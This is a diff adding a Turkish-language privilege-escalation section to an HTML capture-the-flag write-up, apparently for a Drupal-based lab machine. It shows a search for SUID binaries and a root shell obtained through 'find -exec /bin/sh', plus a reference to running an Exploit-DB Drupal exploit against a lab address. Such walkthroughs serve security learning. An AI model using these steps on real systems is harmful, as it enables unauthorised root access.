@@ -186,8 +186,56 @@ python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.171.
 
 <hr>
 <h3>4	Yetki Yükseltme</h3>
+<p>Kernel için exploit aradım ancak bir şey bulamadım. Bunda dolayı suid biti etken olan dosyaları aramaya karar verdim. </p>
+<pre>find / -perm -u=s -type f</pre>
+<pre>
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+/bin/umount
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/procmail
+/usr/bin/find
+/usr/sbin/exim4
+/usr/lib/pt_chown
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/sbin/mount.nfs
+</pre>
 
+<p>Bingo! find aracının çok şükürki -exec parametresi var. Bunu sömürebiliriz. </p>
+<pre>find -exec '/bin/sh' \;</pre>
+<pre>whoami</pre>
+<pre>
+root
+</pre>
+<p>/root içerisinde son flag isimli bir dosya var. Hiç flag bulmadan son flag'e ulaşmak değişik oldu :)</p>
+<pre>
+cd /root</pre>
+<pre>ls</pre>
+<pre>thefinalflag.txt
+</pre><pre>
+cat thefinalflag.txt</pre><pre>
+Well done!!!!
+
+Hopefully you've enjoyed this and learned some new skills.
+
+You can let me know what you thought of this little journey
+by contacting me via Twitter - @DCAU7
+</pre>
+
+<hr>
 <h4>Kaynaklar:<h4>
+<pre>
+https://www.syslogs.org/suid-ve-sgid-bitler-ve-bu-bitlere-sahip-dosyalarin-bulunmasi/
+https://www.drupalturkiye.org/drupal/drupal-nedir
 
 </pre>
 
